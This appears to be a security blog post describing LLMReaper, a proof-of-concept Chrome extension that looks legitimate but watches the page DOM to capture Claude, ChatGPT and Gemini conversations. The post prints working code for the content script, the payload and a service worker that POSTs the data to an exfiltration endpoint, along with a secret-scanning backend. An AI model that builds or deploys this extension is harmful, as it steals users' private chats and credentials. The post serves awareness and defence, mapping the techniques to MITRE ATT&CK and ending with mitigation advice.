@@ -1,0 +1,104 @@
+---
+title: "LLMReaper - DOM Based AI Conversation Exfiltration via Browser Extensions"
+source_url: https://thewhiteh4t.github.io/blog/ai-chat-llmreaper/
+author: Unknown
+publish_time: 2026-06-02
+created: 2026-06-02
+updated: 2026-06-02
+ingested: 2026-06-02
+sha256: 306fc158045d9416ca3d52679c0ab8fc31555ed6b71513ec75780896732094fa
+tags: [newsletter, security]
+---
+
+
+Published Time: 2026-05-27T00:00:00.000Z
+
+Markdown Content:
+Every time someone pastes their code or config files into LLMs to debug something, or to review code, they assume the conversation stays between them and the AI.
+
+But it doesn't.
+
+Any extension installed in your browser can read that conversation. All of it and In real time without you knowing.
+
+*   In December 2024 , a supply chain attack on the [Cyberhaven Chrome extension](https://www.darktrace.com/blog/cyberhaven-supply-chain-attack-exploiting-browser-extensions) and at least 34 others affected around 2.6 million users
+*   In February 2025, [GitLab's threat intelligence](https://gitlab-com.gitlab.io/gl-security/security-tech-notes/threat-intelligence-tech-notes/malicious-browser-extensions-feb-2025/) team identified 16 malicious Chrome extensions impacting at least 3.2 million users
+*   In April 2026, a coordinated campaign of over 100 malicious Chrome extensions was [found stealing Google OAuth2](https://www.rescana.com/post/over-100-malicious-chrome-extensions-in-chrome-web-store-steal-google-and-telegram-data-create-pers) Bearer tokens and Telegram sessions
+
+As you can see malicious browser extensions remain a popular attack vector since the reach is massive and people are constantly looking for tools and utilities to make their work and life easier. But an average user is at high risk because escaping a supply chain attack is out of scope and social engineering is hard to beat.
+
+When you install a browser extension and grant it access to a site, you're giving it the ability to read everything on that page. The DOM. The prompts we use and the responses we get are all part of the DOM and that's how it gets displayed.
+
+Extensions use a standard browser API called `MutationObserver` to watch for changes in the DOM in real time. So when we send a prompt and get the response both events can be tracked using it. This is a normal feature but this helps lot of extensions function properly.
+
+And the permissions required to do this? "read and change all your data on websites you visit". It looks normal and it is required by many legitimate extensions and majority of us allow it without thinking twice. Same permissions can be abused by a malicious extension in the background.
+
+_Disclaimer : many parts of this PoC can be improved, also please excuse my javascript..._
+
+When i thought about testing this I was assuming creating browser extensions must be difficult but to my surprise its not that hard and its kind of fun actually specially for someone who is into web development.
+
+LLMReaper is a proof of concept which demonstrates how a malicious extension can look legitimate and social engineer users and in the background it can fetch conversations in real time without any indications.
+
+Structure of LLMReaper is simple :
+
+`.├── chrome_ext│   ├── manifest.json│   ├── popup.html│   ├── popup.js│   └── scripts│       ├── background.js│       └── content.js├── LICENSE├── llmreaper.py└── README.md`
+
+It has two main parts, backend and the unpacked extension. For this PoC i created a chrome extension but with minor changes we can make a firefox extension as well both compliant with Manifest V3.
+
+In the manifest we specify the content scripts and the service workers along with the permissions required by the extension. In this case however no permissions are needed.
+
+`"action": {    "default_popup": "popup.html"  },"content_scripts": [    {      "js": ["scripts/content.js"],      "matches": [        "https://claude.ai/*",        "https://chatgpt.com/*",        "https://gemini.google.com/*"      ]    }  ],"background": {    "service_worker": "scripts/background.js",    "type": "module"  }`
+
+When we click the extension icon we see a popup window, so as you might have guessed `popup.html` is the file where our extension _front-end_ lives. Here is an example of a legitimate _looking_ extension :
+
+![Image 1: Figure 1 showing LLMReaper - DOM Based AI Conversation Exfiltration via Browser Extensions written by thewhiteh4t](https://res.cloudinary.com/dg5ijxsap/image/upload/f_auto,q_auto/v1779859042/2026-05-27_10-45_tumxub.png)
+Real magic happens inside the `content_scripts` this is where we use `MutationObserver` to watch DOM changes and parse it according to the platform we are targeting. For this PoC I added custom parsing for Claude, ChatGPT and Gemini, the big 3.
+
+I have used various selector queries to match user prompts and LLM responses but the main challenge was detecting when the response completes since we see a streaming output in these platforms. We can't fire a capture query every few seconds because that would mean lot of duplicate and chunks of the response depending on the length, but all three platforms have a thing in common **the stop button**. It maintains its state until the response is completed and then changes so I used the stop button to track response completion and it was good enough for the PoC.
+
+`const STOP_SIGNALS = {  ChatGPT: 'button[data-testid="stop-button"]',  Claude: 'button[aria-label="Stop response"]',  Gemini: 'button[aria-label*="Stop"]',};const stopBtn = document.querySelector(STOP_SIGNALS[platform.name]);    const generating = !!stopBtn;    if (wasGenerating && !generating) {      clearTimeout(renderTimeout);      renderTimeout = setTimeout(processExfiltration, 150);    }    wasGenerating = generating;  });  observer.observe(document.body, { childList: true, subtree: true });`
+
+After the stop signal is found we wait for a bit and run the exfil function.
+
+In exfil we can pick up few more things such as username being used for the platform, _in case of gemini we also get the gmail ID of the user_, page title which is also the chat title and the rest of the conversation parsing logic lives in it. You can read the full code on [github](https://github.com/thewhiteh4t/LLMReaper).
+
+A payload is formed like this :
+
+`const payload = {    platform: config.name,    meta: {      title: config.getTitle(),      user: getUsername(config.name),      timestamp: new Date().toISOString(),    },    conversation: latestPair,  };  const currentPayloadStr = JSON.stringify(payload);  if (currentPayloadStr !== lastSentPayload) {    lastSentPayload = currentPayloadStr;    chrome.runtime.sendMessage({ action: "exfiltrate", data: payload });  }`
+
+notice that there is no fetch query, we can use it inside `content.js` but it's better to do that in a service worker instead, because :
+
+![Image 2: Figure 2 showing LLMReaper - DOM Based AI Conversation Exfiltration via Browser Extensions written by thewhiteh4t](https://res.cloudinary.com/dg5ijxsap/image/upload/f_auto,q_auto/v1779860225/2026-05-27_11-06_ysho1t.png)
+so we have a proper workaround for Same Origin Policy… you can read more about it [here](https://developer.chrome.com/docs/extensions/develop/concepts/network-requests).
+
+This is how the service worker i.e. `background.js` in this case looks like :
+
+`const SERVER_URL = "http://localhost:8080/exfil";chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {  handleExfil(message);  sendResponse({ status: "ok" });});async function handleExfil(data) {  try {    await fetch(SERVER_URL, {      method: "POST",      headers: { "Content-Type": "application/json" },      body: JSON.stringify(data),    });  } catch (err) {    console.error("[bg] exfil failed:", err);  }}`
+
+For the PoC i used localhost but this can be replaced with something like a tunnel provider such as ngrok or cloudflare. Its a simple fetch query which sends the conversation to our FastAPI backend server.
+
+The python script is also simple as it receives the query, passes the conversation through a set of regex patterns and displays the conversation along with any secret detection. Here is how it looks for a test prompt in gemini :
+
+![Image 3: Figure 3 showing LLMReaper - DOM Based AI Conversation Exfiltration via Browser Extensions written by thewhiteh4t](https://res.cloudinary.com/dg5ijxsap/image/upload/f_auto,q_auto/v1779860807/2026-05-27_11-15_kmcpbh.png)
+and after secrets detection :
+
+![Image 4: Figure 4 showing LLMReaper - DOM Based AI Conversation Exfiltration via Browser Extensions written by thewhiteh4t](https://res.cloudinary.com/dg5ijxsap/image/upload/f_auto,q_auto/v1779860806/2026-05-27_11-16_rm6zh1.png)
+You can watch it in action here : [YouTube](https://www.youtube.com/watch?v=Hq8yIQS0kdo)
+
+LLMReaper demonstrates techniques documented in the MITRE ATT&CK framework:
+
+| Technique | ID | Description |
+| --- | --- | --- |
+| Masquerading | T1036 | Extension presents a legitimate-looking UI while capturing conversations in the background |
+| Web Portal Capture | T1056.003 | Passively reads user prompts and AI responses rendered in the DOM |
+| Exfiltration Over C2 Channel | T1041 | Captured conversations POSTed to attacker-controlled server via service worker |
+| Supply Chain Compromise | T1195 | Malicious extensions distributed via legitimate browser stores |
+| Credentials from Web Browsers | T1555.003 | API keys, tokens, passwords detected via regex in captured conversation content |
+
+*   Check your extensions and remove anything you do not use or is looking suspicious
+*   Never paste credentials or any sensitive data into chats
+*   Use multiple browser profiles as they provide isolation
+*   Treat AI conversation content as an unencrypted channel
+*   Include browser extension risk in security awareness training
+
+You can view the code and download the project on [GitHub - LLMReaper](https://github.com/thewhiteh4t/LLMReaper). You can use it as awareness exercise within your teams and show them the problem practically.
+
